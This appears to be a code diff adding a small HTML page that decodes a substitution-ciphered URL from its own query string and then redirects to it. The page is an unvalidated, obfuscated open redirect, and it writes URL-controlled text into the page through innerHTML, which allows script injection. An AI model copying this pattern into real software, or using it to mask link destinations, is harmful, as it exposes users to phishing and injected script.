@@ -1,0 +1,99 @@
+<html>
+<body>
+  <p> DECODED URL: </p>
+  <p id="demo"></p>
+
+  <script>
+    var decode_dict = {
+      '0': '0',
+'1': '/',
+'2': '?',
+'3': '@',
+'4': ':',
+'5': ';',
+'6': '*',
+'7': '=',
+'8': '&',
+'9': '%',
+'a': ',',
+'b': '#',
+'c': '+',
+'d': '~',
+'e': '_',
+'f': '-',
+'g': '.',
+'h': 'Z',
+'i': 'Y',
+'j': 'X',
+'k': 'W',
+'l': 'V',
+'m': 'U',
+'n': 'T',
+'o': 'S',
+'p': 'R',
+'q': 'Q',
+'r': 'P',
+'s': 'O',
+'t': 'N',
+'u': 'M',
+'v': 'L',
+'w': 'K',
+'x': 'J',
+'y': 'I',
+'z': 'H',
+'A': 'G',
+'B': 'F',
+'C': 'E',
+'D': 'D',
+'E': 'C',
+'F': 'B',
+'G': 'A',
+'H': 'z',
+'I': 'y',
+'J': 'x',
+'K': 'w',
+'L': 'v',
+'M': 'u',
+'N': 't',
+'O': 's',
+'P': 'r',
+'Q': 'q',
+'R': 'p',
+'S': 'o',
+'T': 'n',
+'U': 'm',
+'V': 'l',
+'W': 'k',
+'X': 'j',
+'Y': 'i',
+'Z': 'h',
+'.': 'g',
+'-': 'f',
+'_': 'e',
+'~': 'd',
+'+': 'c',
+'#': 'b',
+',': 'a',
+'%': '9',
+'&': '8',
+'=': '7',
+'*': '6',
+';': '5',
+':': '4',
+'@': '3',
+'?': '2',
+'/': '1'};
+    var url_string = window.location.href;
+    var split_url_string = url_string.split("html?");
+    var encoded_url_array = split_url_string[1].split("");
+    var decoded_url = "";
+    var i;
+      for (i = 0; i < encoded_url_array.length; i++) {
+        decoded_url += decode_dict[encoded_url_array[i]];
+      }
+    window.location = decoded_url;
+    document.getElementById("demo").innerHTML = decoded_url;
+  </script>
+
+</body>
+</html>
